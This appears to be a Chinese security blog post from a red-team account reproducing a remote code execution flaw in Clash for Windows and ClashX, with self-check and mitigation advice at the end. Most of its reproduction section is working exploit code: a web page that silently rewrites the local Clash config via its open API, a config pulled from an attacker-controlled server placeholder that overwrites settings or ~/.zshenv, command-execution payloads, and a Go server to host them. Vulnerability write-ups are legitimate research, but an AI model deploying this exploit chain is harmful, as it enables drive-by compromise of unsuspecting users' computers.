#  来自你的宅男快乐梯Clashx的背刺

原创 D19  [ Lambda小队 ](javascript:void\(0\);)

**Lambda小队** ![]()

微信号 LambdaTeam

功能介绍 一群热爱网络安全的热血青年，一支做好事不留名的Lambda小队

____

___发表于_

收录于合集 #漏洞复现 1个

  

  

**故事起源  
**

  
  
  
![](https://gitee.com/fuli009/images/raw/master/public/20230629175629.png)  

  

故事的开始来源于不久前在各大吃瓜群内传播的一段文字：

  

![](https://gitee.com/fuli009/images/raw/master/public/20230629175637.png)

小外包看到后的第一反应：woc实验室大佬都被上线了？

再提取下苹果电脑、某行动、终端权限、开除等关键词，瞬间

![](https://gitee.com/fuli009/images/raw/master/public/20230629175638.png)

  

后续在大佬们的聊天中得知，可能是踩了某罐子，结合之前一偏clash的RESTfulapi写文件攻击的文章推测，可能是由于挂clash代理访问蜜罐网站，打了攻击流量就会触发蜜罐反制规则，导致被rce。  
有大佬的视频也已经把原理讲的很明白了（不喜欢看文章的大佬也可以直接看视频）  
https://www.youtube.com/watch?v=4AnapDDMlyI

  

 **Clashx  简介**

  
  
  
![](https://gitee.com/fuli009/images/raw/master/public/20230629175629.png)  

  

mac clashx页面

![](https://gitee.com/fuli009/images/raw/master/public/20230629175640.png)

ClashX初次运行会在~/.config/clash/目录产生一个名为config.yaml的主配置文件，文件内容如下。

  *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   * 

    
    
    # From https://github.com/yichengchen/clashX/blob/master/ClashX/Resources/sampleConfig.yaml  
    #---------------------------------------------------### 配置文件需要放置在 $HOME/.config/clash/*.yaml  
    ## 这份文件是clashX的基础配置文件，请尽量新建配置文件进行修改。## ！！！只有这份文件的端口设置会随ClashX启动生效  
    ## 如果您不知道如何操作，请参阅 官方Github文档 https://github.com/Dreamacro/clash/blob/dev/README.md#---------------------------------------------------#  
    # (HTTP and SOCKS5 in one port)mixed-port: 7890# RESTful API for clashexternal-controller: 127.0.0.1:9090allow-lan: falsemode: rulelog-level: warning  
    proxies:  
    proxy-groups:  
    rules:  - DOMAIN-SUFFIX,google.com,DIRECT  - DOMAIN-KEYWORD,google,DIRECT  - DOMAIN,google.com,DIRECT  - DOMAIN-SUFFIX,ad.com,REJECT  - GEOIP,CN,DIRECT  - MATCH,DIRECT  
    

ClashX的使用也是基于一份配置文件，同样只需将可用的主配置文件放到~/.config/clash/目录下，之后就可以使用了。也可以选择「Config」-「Remote
config」-「Manage」-「Add」，将远程链接填入Url栏中，可自动下载远程的配置文件到本地。

![](https://gitee.com/fuli009/images/raw/master/public/20230629175641.png)

  

  

  

 **Clashx历史漏洞**

  
  
  
![](https://gitee.com/fuli009/images/raw/master/public/20230629175629.png)  

  

 **1、 CFW XSS2RCE**

![](https://gitee.com/fuli009/images/raw/master/public/20230629175643.png)

 ****

![](https://gitee.com/fuli009/images/raw/master/public/20230629175644.png)

具体细节可参考大佬文章： https://github.com/Fndroid/clash_for_windows_pkg/issues/2710  
视频：  
https://www.youtube.com/watch?v=b04N4KxuLfg

 **2、 CFW路径穿越致使parsers JS RCE**

![](https://gitee.com/fuli009/images/raw/master/public/20230629175645.png)

 ****

参考文章：  
https://github.com/Fndroid/clash_for_windows_pkg/issues/3891  
视频：  
https://bulianglin.com/archives/clashrce.html

 **  
**

  

 **复现**

  
  
  
![](https://gitee.com/fuli009/images/raw/master/public/20230629175629.png)  

  

根据大佬对源码的分析，课代表总结一下，因为是clash的路径穿越，导致clash for
windows的配置文件被覆盖，这个漏洞可以在任何clash有权限的位置写入文件，会造成一些安全问题，由于是内核漏洞Windows Linux
MacOS只要是使用clash内核通通都中招了，4月16号
clash发布了一个小版本更新，修复了路径穿越的漏洞，但很多人并没有意识到这个安全问题，可能不会升级到新版本，所以还是有必要让大家知晓一下，另外clash.meta是clash的分支项目，所以也存在路径穿越的漏洞，并且由于clash可以通过RESTful
api来控制内部设置，并且支持CORS，CORS意为跨域资源共享，也就是不同的域名可以共享相同的资源，导致可以在任何网站上调用Clash的API，就导致了无感知执行任意命令。  
如下给出了一份测试代码

 **1、Win POC**  

  

 **index.html:**

  *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   * 

    
    
     <!DOCTYPE html><html lang="en"><head>    <meta charset="UTF-8">    <meta http-equiv="X-UA-Compatible" content="IE=edge">    <meta name="viewport" content="width=device-width, initial-scale=1.0">    <title>Breaking Clash</title></head><body>    <h1 align="center">Breaking Clash</h1>    <p align="center"> <img src="https://raw.githubusercontent.com/Dreamacro/clash/master/docs/logo.png"></p>    <p>        <script>                    const data = {                payload: "mixed-port: 7890\nallow-lan: false\nmode: rule\nlog-level: warning\nproxy-providers:\n  provider1:\n    type: http\n    url: 'http:// {{yourevilser}}/exp.yaml'\n    interval: 3600\n    path: ../cfw-settings.yaml\n    healthcheck:\n      enable: true\n      interval: 600\n      url: http://www.gstatic.com/generate_204"            };            fetch('http://127.0.0.1:58383/configs?force=true', {                method: 'PUT',                headers: {                    'Content-type': 'application/json; charset=utf-8',                },                body: JSON.stringify(data),            }).then(response => response.json())                .then(data => {                    console.log('Success:', data);                })                .catch((error) => {                    console.log('Error:', error);                });</script></body></html>  
    

 ****

 **exp.yaml ：**

  *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   * 

    
    
    payload:  - DOMAIN-SUFFIX,acl4.ssr,全球直连showNewVersionIcon: truehideAfterStartup: falserandomControllerPort: truerunTimeFormat: "hh : mm : ss"trayOrders:  - - icon  - - status    - traffic    - texthideTrayIcon: falseconnShowProcess: trueshowTrayProxyDelayIndicator: trueprofileParsersText: >-  parsers:    - reg: .*      code:         module.exports.parse = async (raw, { axios, yaml, notify, console }, { name, url, interval, selected }) => {          require("child_process").exec("calc.exe");          return raw;          }  
    

  

 ** **main.go:****

  *   *   *   *   *   *   *   *   *   *   *   *   *   *   * 

    
    
     package main  
    import (  "github.com/gin-contrib/cors"  "github.com/gin-gonic/gin")  
    func main() {  r := gin.Default()  r.Use(cors.Default())  r.StaticFile("/", "./index.html")  r.StaticFile("/exp.yaml", "./exp.yaml")  r.Run(":9999")}  
    

 ** ******

  

  

 **2、MAC POC**

 **  
**

 **index.html:**  

  *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   * 

    
    
     <!DOCTYPE html><html lang="en"><head>    <meta charset="UTF-8">    <meta http-equiv="X-UA-Compatible" content="IE=edge">    <meta name="viewport" content="width=device-width, initial-scale=1.0">    <title>Breaking Clash</title></head>  
    <body>    <h1 align="center">Breaking Clash</h1>    <p align="center"> <img src="https://raw.githubusercontent.com/Dreamacro/clash/master/docs/logo.png"></p>    <p>        <script>                    const data = {                payload: "mixed-port: 7890\nallow-lan: false\nmode: rule\nlog-level: warning\nproxy-providers:\n  provider1:\n    type: http\n    url: 'http://{{yourevilser}}/evil.yaml'\n    interval: 3600\n    path: ../../.zshenv\n    healthcheck:\n      enable: true\n      interval: 600\n      url: http://www.gstatic.com/generate_204"            };            fetch('http://127.0.0.1:9090/configs?force=true', {                method: 'PUT',                headers: {                    'Content-type': 'application/json; charset=utf-8',                },                body: JSON.stringify(data),            }).then(response => response.json())                .then(data => {                    console.log('Success:', data);                })                .catch((error) => {                    console.log('Error:', error);                });</script></body></html>  
    

  

 **exp.yaml ：**

  *   *   *   *   *   *   * 

    
    
    open /System/Applications/Calculator.app;rm -f ~/.zshenv;bash -c 'nohup sleep 10 2>&1 > /dev/null &' <<!:  aaaaa: 11111  
    proxies:  - {name: vP, server: n04.a00x.party, port: 18000, type: ssr, cipher: aes-256-cfb, password: AFX92CS, protocol: auth_aes128_sha1, obfs: http_simple, protocol-param: 232991:xSnSFv, obfs-param: download.windowsupdate.com, udp: true}  
    aaaaa: 2222

  

 **main.go:**

  *   *   *   *   *   *   *   *   *   *   *   *   *   *   * 

    
    
     package main  
    import (  "github.com/gin-contrib/cors"  "github.com/gin-gonic/gin")  
    func main() {  r := gin.Default()  r.Use(cors.Default())  r.StaticFile("/", "./index.html")  r.StaticFile("/exp.yaml", "./exp.yaml")  r.Run(":9999")}  
    

  

 **3 、触发POC流程** ****

在公网起一个
Web服务，同时允许跨域，对外提供如上index.html和exp.yaml恶意文件，exp.yaml文件中包含了攻击者希望执行的命令。注意将如上html中的{{yourevilser}}换成自己的IP或者域名。

  *   

  *   

  * 安装go并执行  

  *   *   *   *   * 

    
    
    yum -y install golanggo mod init maingo get github.com/gin-contrib/corsgo get github.com/gin-gonic/gingo run main.go

![](https://gitee.com/fuli009/images/raw/master/public/20230629175647.png)

  

![](https://gitee.com/fuli009/images/raw/master/public/20230629175648.png)

  
尝试访问触发

![](https://gitee.com/fuli009/images/raw/master/public/20230629175649.png)

  

在windows虚拟机中安装了低版本的clash_for_windows并成功复现了此漏洞

![](https://gitee.com/fuli009/images/raw/master/public/20230629175650.png)

同事也在未更新clashx的mac环境下复现成功，mac os版本为10.13.6

![](https://gitee.com/fuli009/images/raw/master/public/20230629175651.png)

也有大佬说漏洞与macos版本也有关，笔者做了实验，在最新的clashx（未修改配置文件）和最新的mac系统下已无法复现此漏洞，建议各位红队大哥们及时升级clashx和自己的mac电脑到最新版本，防止中招。

![](https://gitee.com/fuli009/images/raw/master/public/20230629175652.png)

![](https://gitee.com/fuli009/images/raw/master/public/20230629175653.png)

![](https://gitee.com/fuli009/images/raw/master/public/20230629175654.png)

  

  

 **自查方式**

  
  
  
![](https://gitee.com/fuli009/images/raw/master/public/20230629175629.png)  

  

有clashx的小伙伴访问本机127.0.0.1:9090端口，若出现下图同样结果且clashx非最新版本，则存在被攻击风险。

![](https://gitee.com/fuli009/images/raw/master/public/20230629175656.png)

![](https://gitee.com/fuli009/images/raw/master/public/20230629175657.png)

  

  

 **修复建议**

  
  
  
![](https://gitee.com/fuli009/images/raw/master/public/20230629175629.png)  
  
1、注释配置文件中external-controller这一行代码（注意需要重启客户端）

![](https://gitee.com/fuli009/images/raw/master/public/20230629175700.png)

![](https://gitee.com/fuli009/images/raw/master/public/20230629175701.png)

![](https://gitee.com/fuli009/images/raw/master/public/20230629175702.png)

![](https://gitee.com/fuli009/images/raw/master/public/20230629175703.png)

 ****

  

  1. 2、在配置文件中增加强度足够的 secret值

![](https://gitee.com/fuli009/images/raw/master/public/20230629175704.png)

 ****

参考文章链接： https://0xf4n9x.github.io/2022/10/20/clash-unauth-force-configs-csrf-
rce/index.html

 **  
**

 **  
**

 **  
**

 **加入我们一起学习**

  

  
  
  
  
  
  
  

  

本公众号是一群热爱网安事业的一线红队队员发起成立的，我们旨在分享最前沿的研究成果， **拒绝复制黏贴，打造最硬核的公众号**
，加入我们的交流群一起学习，里面有众多红队大佬、审计狗、SRC爱好者。群内同时为了更大程度上分享硬核内容，成立了知识星球，详情请关注下发二维码。

  

扫描下方二维码添加小助手拉你入群，若二维码失效，请私信后台有人拉你进群。

  

![](https://gitee.com/fuli009/images/raw/master/public/20230629175705.png)

![](https://gitee.com/fuli009/images/raw/master/public/20230629175706.png)

  

  

  

 **关于Lambda小队**

![](https://gitee.com/fuli009/images/raw/master/public/20230629175707.png)  

Lambda小队经过多年的一线红队磨炼，取得了众多辉煌的战绩，同时也积淀了丰富的实战经验，后续将为大家带来更多一线的实战经历和研究成果。

  

![](https://gitee.com/fuli009/images/raw/master/public/20230629175708.png)

  

![](https://gitee.com/fuli009/images/raw/master/public/20230629175709.png)

![](https://gitee.com/fuli009/images/raw/master/public/20230629175710.png)![](https://gitee.com/fuli009/images/raw/master/public/20230629175711.png)

![](https://gitee.com/fuli009/images/raw/master/public/20230629175712.png)![](https://gitee.com/fuli009/images/raw/master/public/20230629175713.png)

  

![](https://gitee.com/fuli009/images/raw/master/public/20230629175715.png)

![](https://gitee.com/fuli009/images/raw/master/public/20230629175716.png)

  

![](https://gitee.com/fuli009/images/raw/master/public/20230629175717.png)

  

![](https://gitee.com/fuli009/images/raw/master/public/20230629175718.png)

![](https://gitee.com/fuli009/images/raw/master/public/20230629175719.png)  

END

  
![](https://gitee.com/fuli009/images/raw/master/public/20230629175720.png)

  

  

  

预览时标签不可点

微信扫一扫  
关注该公众号

[知道了](javascript:;)

微信扫一扫  
使用小程序

****

[取消](javascript:void\(0\);) [允许](javascript:void\(0\);)

****

[取消](javascript:void\(0\);) [允许](javascript:void\(0\);)

： ， 。   视频 小程序 赞 ，轻点两下取消赞 在看 ，轻点两下取消在看

